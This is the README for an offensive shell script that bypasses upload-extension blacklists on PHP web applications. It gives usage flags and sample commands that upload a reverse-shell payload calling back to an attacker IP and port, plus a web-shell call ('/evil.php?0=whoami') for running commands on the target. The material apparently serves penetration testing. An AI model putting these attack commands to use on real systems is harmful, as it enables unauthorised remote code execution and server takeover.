# Uploader
A simple shell script that attempts to bypass extension blacklists for file uploads. If no arguments are provided it will default to interactive mode.

## Usage

`-h`: Display this help message

`-i <IP_Addres>`: The IP Address to use for the Reverse Shell payload (i.e. your interface)

`-p <PORT>`: The port that your listener is running on

`-u <URL>`: The target URL that's used in POST Requests to upload a file

`-n <NAME>`: The 'name' attribute that's used in POST Requests (e.g. `file` for name="file")

`-e <URL>`: Exploit mode. Attempts to automatically trigger a Reverse Shell. Enter the URL where uploaded files are saved to.

`-b`: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. `/evil.php?0=whoami`) . Incompatible with `-e`

`-a <EXTENSION>`: Allowed extension to use with Null Byte (defaults to jpg). Enter the extension without a period prepended.

 For example,

 `./uploader.sh -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/ -a png`

 `./uploader.sh -u http://10.10.40.117/panel/ -n fileUpload -b`

## Functionality
As of now, Uploader is only designed for PHP based Web Applications that have file upload functionality using a POST request to send Boundary (multipart) Data.

The Reverse Shell payload works against Linux machines.

## In Development
This will eventually be integrated into the Ares toolsuite (https://github.com/Komodo-pty/ares-attack)

The following will be added in subsequent updates:

1) Support for more languages
2) Support for more types of file uploads
3) More types of upload bypasses
4) Payloads for Windows
